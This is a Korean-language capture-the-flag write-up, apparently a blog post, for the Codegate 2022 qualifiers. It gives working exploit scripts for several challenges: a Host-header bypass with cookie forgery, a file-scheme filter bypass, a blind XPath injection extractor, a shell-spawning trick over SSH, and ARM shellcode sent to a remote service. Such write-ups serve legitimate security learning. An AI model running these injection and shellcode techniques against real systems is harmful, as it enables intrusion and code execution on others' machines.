[{"content":" University Division, imssm99, 3rd (4249 points)\n CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.\ndriver.get(\u0026#39;http://3.39.55.38:1929/login\u0026#39;) driver.find_element_by_id(\u0026#39;id\u0026#39;).send_keys(\u0026#39;admin\u0026#39;) driver.find_element_by_id(\u0026#39;pw\u0026#39;).send_keys(\u0026#39;$MiLEYEN4\u0026#39;) driver.find_element_by_id(\u0026#39;submit\u0026#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { \tencrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) \tthis.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(\u0026#34;auth_crypt_key\u0026#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.\n... } else if controllerName == \u0026#34;AdminController\u0026#34; {  domain := this.Ctx.Input.Domain()   if domain != \u0026#34;localhost\u0026#34; {  this.Abort(\u0026#34;Not Local\u0026#34;)  return  } } ... func (this *AdminController) AuthKey() { \tencrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) \tthis.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } /admin/authkey에 Host: localhost Header를 설정하여 접속하면 encrypted_auth_key를 얻을 수 있다. encrypted_auth_key를 빈 Key로 Decrypt하여 flag를 얻는데 필요한 Cookie를 설정할 수 있었다.\nimport requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import hashlib  url = \u0026#34;http://localhost:1030\u0026#34;  r = requests.get(f\u0026#34;{url}/admin/authkey\u0026#34;, headers={\u0026#34;Host\u0026#34;: \u0026#34;localhost\u0026#34;}) enc_auth_key = bytes.fromhex(r.text)  admin_id = b\u0026#34;admin\u0026#34;  cipher = AES.new(pad(b\u0026#34;\u0026#34;, 16), AES.MODE_CBC, pad(b\u0026#34;\u0026#34;, 16)) auth_key = unpad(cipher.decrypt(enc_auth_key), 16) print(auth_key)  cookies = {} cookies[hashlib.md5(b\u0026#34;sess\u0026#34;).hexdigest()] = hashlib.md5(admin_id + auth_key).hexdigest()  r = requests.get(f\u0026#34;{url}/main/index\u0026#34;, cookies=cookies) print(r.text)  babyFirst lookupImg Method는 메모 내용의 [] 안의 url을 읽어 그 내용을 base64 encode하여 img src에 출력해준다. URL의 처음에 file:이 있으면 동작하지 않는다. 이를 우회하기 위해 java.net.URL에서 찾은 다음과 같은 코드를 이용했다.\nif (spec.regionMatches(true, start, \u0026#34;url:\u0026#34;, 0, 4)) {  start += 4; } 메모 내용에 [url:file:/flag] 를 쓴 후 읽는다. img src의 값을 base64 decode하여 flag를 획득 할 수 있었다. data:image/jpeg;charset=utf-8;base64,Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg==\n myblog XPath xpath = XPathFactory.newInstance().newXPath();  String title = (String)xpath.evaluate(\u0026#34;//article[@idx=\u0026#39;\u0026#34; + idx + \u0026#34;\u0026#39;]/title/text()\u0026#34;, document, XPathConstants.STRING);  String content = (String)xpath.evaluate(\u0026#34;//article[@idx=\u0026#39;\u0026#34; + idx + \u0026#34;\u0026#39;]/content/text()\u0026#34;, document, XPathConstants.STRING); /blog/read에서 idx 인자에 xpath injection이 가능하다.\nRUN echo \u0026#39;flag=codegate2022{md5(flag)}\u0026#39; \u0026gt;\u0026gt; /usr/local/tomcat/conf/catalina.propertiescatalina.properties에 flag가 저장되어 있으므로 system-property(’flag’)를 이용하면 flag를 획득할 수 있다.\nBlind Injection으로 flag의 값을 구했다.\nimport requests import string  url = \u0026#34;http://3.39.79.180\u0026#34; uid = \u0026#34;imssm9999\u0026#34; upw = \u0026#34;asdasdasd\u0026#34;  s = requests.Session()  r = s.post(f\u0026#34;{url}/blog/register\u0026#34;, data={\u0026#34;id\u0026#34;: uid, \u0026#34;pw\u0026#34;: upw}) print(r.text)  r = s.post(f\u0026#34;{url}/blog/login\u0026#34;, data={\u0026#34;id\u0026#34;:uid, \u0026#34;pw\u0026#34;: upw}) print(r.text)  r = s.post(f\u0026#34;{url}/blog/write\u0026#34;, data={\u0026#34;title\u0026#34;: \u0026#34;OKOKOK\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;OKOKOK\u0026#34;}) print(r.text)  def oracle(cond):  idx = f\u0026#34;0\u0026#39; or {cond}and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;  r = s.get(f\u0026#34;{url}/blog/read\u0026#34;, params={\u0026#34;idx\u0026#34;: idx})  return \u0026#34;OKOKOK\u0026#34; in r.text  flag_len = 0 for i in range(1, 0x100):  if oracle(f\u0026#34;string-length(system-property(\u0026#39;flag\u0026#39;))={i}\u0026#34;):  flag_len = i  break  print(flag_len)  flag = \u0026#34;\u0026#34; for i in range(flag_len):  for c in string.printable:  if oracle(f\u0026#34;substring(system-property(\u0026#39;flag\u0026#39;), {i+1}, 1)=\u0026#39;{c}\u0026#39;\u0026#34;):  flag += c  break  print(flag) print(flag)  VIMT 문자를 입력하면 뒤에 랜덤한 문자열이 추가로 생긴다. 바이너리를 분석해보면 set y {n}을 통해 n번째 줄로 이동할 수 있는 기능이 있다. ssh를 통해 접속하는 문제이므로 stty 명령을 통해 columns를 1로 설정하여 한 줄에 한 문자만 쓰이도록 할 수 있다. 이를 이용해 문자를 입력하고, set y {n}으로 입력한 문자의 다음으로 이동하여 원하는 내용을 쓸 수 있다.\nfrom pwn import *  code = \u0026#34;\u0026#34;\u0026#34;main() { system(\u0026#34;/bin/sh\u0026#34;); } //\u0026#34;\u0026#34;\u0026#34; rows = len(code)+10  s = ssh(user=\u0026#34;ctf\u0026#34;, host=\u0026#34;3.38.59.103\u0026#34;, port=1234, password=\u0026#34;ctf1234_smiley\u0026#34;) p = s.process(\u0026#34;/bin/sh\u0026#34;) p.sendlineafter(\u0026#34;$ \u0026#34;, f\u0026#34;stty rows {rows}cols 1\u0026#34;.encode()) p.sendlineafter(\u0026#34;$ \u0026#34;, b\u0026#34;./app\u0026#34;)  def rr():  for i in range(rows-1):  p.readline()  rr()  for i in range(len(code)):  p.send(code[i])  rr()  p.send(\u0026#34;\\x1b\u0026#34;)  p.sendlineafter(\u0026#34;:\u0026#34;, f\u0026#34;set y {i}\u0026#34;)  p.send(\u0026#34;\\x1b\u0026#34;) p.sendlineafter(\u0026#34;:\u0026#34;, \u0026#34;compile\u0026#34;) p.interactive()  ARVM if ( run_vm() == -1 )  exit(-1); puts(\u0026#34;Good! Now Execute Real Machine\u0026#34;); dest = calloc(1u, 0x1000u); memcpy(dest, *(const void **)(dword_2407C + 8), 0x1000u); memset(*(void **)(dword_2407C + 8), 0, 0x1000u); memcpy(*(void **)(dword_2407C + 8), \u0026amp;unk_1346C, 0x34u); v3 = memcpy((void *)(*(_DWORD *)(dword_2407C + 8) + 52), dest, 0xFCCu); (*(void (__fastcall **)(void *))(dword_2407C + 8))(v3); vm을 작동하는 함수가 -1을 반환하지 않으면, 입력한 code를 실행해준다. code의 처음에 0x0이 있다면 그대로 run_vm()이 정상적으로 종료되는 것을 확인할 수 있었다. 그 뒤에 shellcode를 추가하여 shell을 획득할 수 있었다.\nfrom pwn import *  context.arch = \u0026#34;arm\u0026#34;  p = remote(\u0026#34;15.165.92.159\u0026#34;, 1234) p.recvline() p.recvline()  code = b\u0026#34;\u0026#34; code += p32(0) code += b\u0026#34;\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x49\\x40\\x52\\x40\\xc2\\x71\\x0b\\x27\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x78\u0026#34;  p.sendafter(b\u0026#34;:\u0026gt; \u0026#34;, code)  def view_code():  p.sendafter(b\u0026#34;:\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;)  return p.recvuntil(b\u0026#34;1. Run\u0026#34;)[:-6]  def run_code():  p.sendafter(b\u0026#34;:\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;)  p.recvuntil(b\u0026#34;Secret code : \u0026#34;)  code = p.recvline().strip()  p.sendlineafter(b\u0026#34;:\u0026gt; \u0026#34;, code)  run_code()  p.interactive() ","permalink":"https://blog.imssm99.kr/ctf/codegate2022_qual/","summary":"University Division, imssm99, 3rd (4249 points)\n CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.\ndriver.get(\u0026#39;http://3.39.55.38:1929/login\u0026#39;) driver.find_element_by_id(\u0026#39;id\u0026#39;).send_keys(\u0026#39;admin\u0026#39;) driver.find_element_by_id(\u0026#39;pw\u0026#39;).send_keys(\u0026#39;$MiLEYEN4\u0026#39;) driver.find_element_by_id(\u0026#39;submit\u0026#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { \tencrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) \tthis.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(\u0026#34;auth_crypt_key\u0026#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.\n... } else if controllerName == \u0026#34;AdminController\u0026#34; {  domain := this.Ctx.Input.Domain()   if domain != \u0026#34;localhost\u0026#34; {  this.","title":"Codegate2022 Qual Writeup"}]